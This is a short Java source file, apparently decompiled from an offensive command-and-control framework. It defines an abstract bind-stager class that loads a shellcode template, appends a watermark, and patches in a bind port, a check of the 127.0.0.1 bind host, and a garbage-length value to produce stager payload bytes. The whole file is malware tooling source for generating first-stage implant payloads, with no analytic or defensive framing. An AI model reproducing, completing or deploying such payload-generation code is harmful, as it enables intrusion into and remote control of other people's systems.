package stagers;

import common.AssertUtils;
import common.CommonUtils;
import common.Packer;
import common.ScListener;

public abstract class GenericBindStager {
   protected ScListener listener;

   public GenericBindStager(ScListener var1) {
      this.listener = var1;
   }

   public abstract String getFile();

   public abstract int getPortOffset();

   public abstract int getDataOffset();

   public abstract int getBindHostOffset();

   public byte[] generate(int var1) {
      String var2 = CommonUtils.bString(CommonUtils.readResource(this.getFile())) + this.listener.getConfig().getWatermark();
      Packer var3 = new Packer();
      var3.addShort(var1);
      var2 = CommonUtils.replaceAt(var2, CommonUtils.bString(var3.getBytes()), this.getPortOffset());
      AssertUtils.TestPatch(var2, "\u007f\u0000\u0000\u0001", this.getBindHostOffset());
      var3 = new Packer();
      var3.little();
      var3.addInt(this.listener.getConfig().getBindGarbageLength());
      var2 = CommonUtils.replaceAt(var2, CommonUtils.bString(var3.getBytes()), this.getDataOffset());
      return CommonUtils.toBytes(var2);
   }
}
